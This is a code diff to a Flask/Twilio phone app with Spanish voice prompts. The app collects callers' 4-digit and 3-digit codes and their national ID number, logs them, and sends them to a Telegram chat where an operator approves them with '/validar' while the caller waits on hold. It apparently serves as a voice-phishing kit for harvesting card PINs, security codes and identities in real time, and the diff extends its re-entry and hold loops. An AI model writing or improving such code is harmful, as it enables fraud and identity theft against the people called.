@@ -125,14 +125,37 @@ def save_step1():
         global_user_sessions[call_sid] = {}
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
+    # Verificar si estamos en un proceso de revalidación
+    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    
+    # Guardar el nuevo código
     global_user_sessions[call_sid]['code4'] = digits
+    
+    # Si había una validación previa, la eliminamos para forzar una nueva validación
+    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
+        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion', None)
+    
     save_session_to_file(global_user_sessions)
     
     logger.info(f"💾 Guardado código 4 dígitos: {digits} para SID={call_sid}")
     
     response = VoiceResponse()
-    response.say(f"Ha ingresado {', '.join(digits)}. Continuando.", language='es-ES')
-    response.redirect('/step2')
+    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
+    
+    # Si estamos en revalidación, notificar a Telegram y esperar validación
+    if is_revalidation:
+        data = global_user_sessions[call_sid]
+        msg = f"🔄 Código de 4 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
+    else:
+        # Flujo normal: continuar al siguiente paso
+        response.say("Continuando.", language='es-ES')
+        response.redirect('/step2')
+    
     return str(response)
 
 @app.route('/step2', methods=['POST', 'GET'])
@@ -159,14 +182,37 @@ def save_step2():
         global_user_sessions[call_sid] = {}
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
+    # Verificar si estamos en un proceso de revalidación
+    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    
+    # Guardar el nuevo código
     global_user_sessions[call_sid]['code3'] = digits
+    
+    # Si había una validación previa, la eliminamos para forzar una nueva validación
+    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
+        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion', None)
+    
     save_session_to_file(global_user_sessions)
     
     logger.info(f"💾 Guardado código 3 dígitos: {digits} para SID={call_sid}")
     
     response = VoiceResponse()
-    response.say(f"Ha ingresado {', '.join(digits)}. Continuando.", language='es-ES')
-    response.redirect('/step3')
+    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
+    
+    # Si estamos en revalidación, notificar a Telegram y esperar validación
+    if is_revalidation:
+        data = global_user_sessions[call_sid]
+        msg = f"🔄 Código de 3 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
+    else:
+        # Flujo normal: continuar al siguiente paso
+        response.say("Continuando.", language='es-ES')
+        response.redirect('/step3')
+    
     return str(response)
 
 @app.route('/step3', methods=['POST', 'GET'])
@@ -195,7 +241,17 @@ def save_step3():
         global_user_sessions[call_sid] = {}
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
+    # Verificar si estamos en un proceso de revalidación
+    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    
+    # Guardar el nuevo código
     global_user_sessions[call_sid]['cedula'] = digits
+    
+    # Si había una validación previa, la eliminamos para forzar una nueva validación
+    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
+        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion', None)
+    
     save_session_to_file(global_user_sessions)
     
     logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")
@@ -206,18 +262,26 @@ def save_step3():
     # Iniciar polling de Telegram si no está activo
     start_telegram_polling()
     
-    msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
-    send_to_telegram(msg)
-
     response = VoiceResponse()
     response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
-    response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
     
-    # Redirigir a la ruta de espera específica con un tiempo de espera inicial 
-    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8")
+    # Mensaje diferente dependiendo si es validación inicial o revalidación
+    if is_revalidation:
+        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+    else:
+        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
+    
+    # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
+    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
     return str(response)
 
-# También puedes crear una ruta para re-verificación específica
+
 @app.route('/reverify', methods=['POST', 'GET'])
 def reverify():
     """
@@ -236,7 +300,8 @@ def reverify():
         msg = f"🔄 Solicitando RE-VERIFICACIÓN:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
         send_to_telegram(msg)
     
-    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=10")
+    # Indica que ES una revalidación
+    response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=10&revalidation=true")
     return str(response)
 
 @app.route('/validate-result', methods=['GET', 'POST'])
@@ -301,8 +366,8 @@ def validate_result():
         count_key = f"{call_sid}_retry_count"
         retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
         
-        # Si llevamos más de 12 intentos, finalizamos la llamada
-        if retry_count > 12:
+        # Si llevamos más de 8 intentos, finalizamos la llamada
+        if retry_count > 8:
             logger.warning(f"⚠️ DEMASIADOS INTENTOS ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
             response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
             return str(response)
@@ -332,12 +397,14 @@ def validate_result():
 def waiting_validation():
     """
     Ruta específica para mostrar un mensaje de espera mientras se validan los datos.
-    Permite especificar un tiempo de espera y redirecciona al resultado de validación.
+    Solo se usa para la segunda validación en adelante.
+    Permanece en esta ruta hasta recibir confirmación desde Telegram.
     """
     call_sid = request.values.get('CallSid')
-    wait_time = int(request.values.get('wait', 6))  # Tiempo de espera en segundos, por defecto 6
+    wait_time = int(request.values.get('wait', 20))  # Tiempo de espera en segundos, por defecto 20
+    is_revalidation = request.values.get('revalidation', 'false').lower() == 'true'
     
-    logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s")
+    logger.info(f"⏳ ESPERANDO VALIDACIÓN PARA SID={call_sid}, TIEMPO={wait_time}s, REVALIDACIÓN={is_revalidation}")
     
     # Si no tenemos SID, no podemos hacer nada
     if not call_sid:
@@ -355,14 +422,30 @@ def waiting_validation():
     
     response = VoiceResponse()
     
-    # Añadir un mensaje personalizado de espera
-    response.say("Estamos validando sus datos nuevamente. Por favor espere unos momentos.", language='es-ES')
-    response.pause(length=2)
-    response.say("La validación puede tomar unos instantes. Gracias por su paciencia.", language='es-ES')
+    # Solo agregar el mensaje específico de "validando nuevamente" si es una revalidación
+    if is_revalidation:
+        response.say("Estamos validando sus datos nuevamente. Por favor espere unos momentos.", language='es-ES')
+        response.pause(length=2)
+        response.say("La validación puede tomar unos instantes. Gracias por su paciencia.", language='es-ES')
+    else:
+        response.say("Estamos validando sus datos. Por favor espere.", language='es-ES')
+    
+    # Pausar por el tiempo especificado
     response.pause(length=wait_time)
     
-    # Redirigir a la verificación de resultados después de la espera
-    response.redirect(f"/validate-result?sid={call_sid}")
+    # Verificar si ya tenemos una validación (podría haber llegado mientras esperábamos)
+    validation = global_user_sessions.get(call_sid, {}).get('validacion')
+    
+    if validation:
+        # Si ya tenemos validación, redirigir al resultado
+        logger.info(f"✅ VALIDACIÓN YA RECIBIDA PARA SID={call_sid}: {validation}")
+        response.redirect(f"/validate-result?sid={call_sid}")
+    else:
+        # Si no hay validación, permanecer en esta ruta esperando (con un mensaje diferente)
+        response.say("Seguimos esperando la confirmación de sus datos.", language='es-ES')
+        response.pause(length=5)
+        # Redirigir a la misma ruta para crear un bucle hasta recibir validación
+        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=10&revalidation=true")
     
     return str(response)
 
@@ -420,17 +503,17 @@ def verify_with_timeout():
     Útil cuando el operador necesita más tiempo.
     """
     call_sid = request.values.get('CallSid')
-    wait_time = request.values.get('wait', '15')  # Tiempo en segundos, por defecto 15
+    wait_time = request.values.get('wait', '20')  # Tiempo en segundos, por defecto 20
     
     try:
         wait_time = int(wait_time)
     except ValueError:
-        wait_time = 15  # Valor predeterminado si hay error
+        wait_time = 20  # Valor predeterminado si hay error
     
     response = VoiceResponse()
     
     # Mensaje personalizado para esperas largas
-    if wait_time > 20:
+    if wait_time > 30:
         response.say("La verificación requiere un tiempo adicional. Le agradecemos su paciencia.", language='es-ES')
         response.say("Estamos trabajando para procesar sus datos correctamente.", language='es-ES')
     else:
@@ -717,4 +800,4 @@ if __name__ == '__main__':
     
     # Configurar el logging
     logger.info("🚀 Iniciando servidor de validación telefónica...")
-    app.run(debug=True, port=5000, host='0.0.0.0')
+    app.run(debug=os.getenv('DEBUG'), port=os.getenv('PORT'), host='0.0.0.0')
